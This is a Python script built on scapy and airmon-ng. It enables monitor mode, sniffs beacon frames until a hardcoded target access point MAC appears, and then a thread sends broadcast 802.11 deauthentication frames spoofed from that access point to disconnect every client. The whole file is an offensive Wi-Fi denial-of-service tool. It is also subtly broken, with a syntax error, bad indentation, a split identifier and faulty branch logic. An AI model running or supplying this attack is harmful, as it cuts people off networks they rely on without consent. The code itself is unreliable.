from scapy.all import * 
import re
import os 
import threading 
from wifi import Cell, Scheme 

target = '5c:57:1a:b8:26:d0'
armed = 0
ap_list = []

def monitor_manage(cmd):
   wifi_file="/proc/net/wireless"
   if os.path.exists(wifi_file):
        with open(wifi_file) as f:
        for line in f.readlines():
                if not re.search(r'Inter-',line) and not re.search(r'face',line):
                    iface=line.split(":")[0]
   if iface and cmd == 'start':
      print('Initializing monitor mode [airmon method]')
      os.system('airmon-ng start {0}'.format(iface.strip()))
   if iface and cmd == 'stop':
      print('Stopping monitor mode [airmon method]')
      os.system('airmon-ng stop {0}'.format(iface.strip()))
   else:
      print('Unknown command or bad interface') 


def packet_process(pkt):
   global ap_list
   if pkt.haslayer(Dot11):
      if pkt.type == 0 and pkt.subtype == 8:
         if pkt.addr2 not in ap_list:
            ap_list.append(pkt.addr2)
            print("AP MAC {0} SSID {1}".format(pkt.addr2,pkt.info))
            

def stop_scan():
   global ap_list
   global target
   global armed 
   if target in ap_list:
      armed = 1
      return True
   else:
      return False 

def load_mon():
   mon_interface = [] 
   with open("/proc/net/dev","r") as f:
      for line in f.readlines():
         if re.search(r'mon[0-9]+',line):
            print("Found airmon-ng interface..",line.split(":")[0].strip())
            mon_interface.append(line.split(":")[0].strip())
   return mon_interface


def seek_target():
   global armed 
   mons = load_mon() 
   sniff(iface=mons[0], prn=packet_process, stop_filter=stop_scan)
   if armed = 1:
      print("Target {0} has been located")
      return True


class DisruptOperator(threading.Thread):
    def __init__(self,count=20,target=None,moni="mon0"):
        threading.Thread.__init__(self)
        self.target=target
        self.count = count
        self.moni=moni
        self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",add
r2=target,addr3=target)/scapy.all.Dot11Deauth()

    def run(self):
        print("Starting deauth at {0} packets".format(self.count))
        for item in range(0, self.count):
            scapy.all.sendp(self.pkt, iface=self.moni,count=1, inter=.2, verbose=0)


    
